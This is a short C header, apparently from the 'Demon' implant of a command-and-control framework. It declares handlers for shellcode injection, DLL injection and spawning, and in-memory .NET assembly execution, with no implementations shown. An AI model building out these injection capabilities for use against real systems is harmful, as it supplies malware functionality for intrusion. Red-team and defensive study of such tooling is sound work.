#ifndef DEMON_COMMAND_INJECT_H
#define DEMON_COMMAND_INJECT_H

#include <core/Parser.h>

VOID CommandInlineExecute( IN PPARSER DataArgs );
VOID CommandInjectDLL( IN PPARSER DataArgs );
VOID CommandSpawnDLL( IN PPARSER DataArgs );
VOID CommandInjectShellcode( IN PPARSER DataArgs );
VOID CommandAssemblyInlineExecute( IN PPARSER DataArgs );
VOID CommandAssemblyListVersion( IN PPARSER DataArgs );

#endif
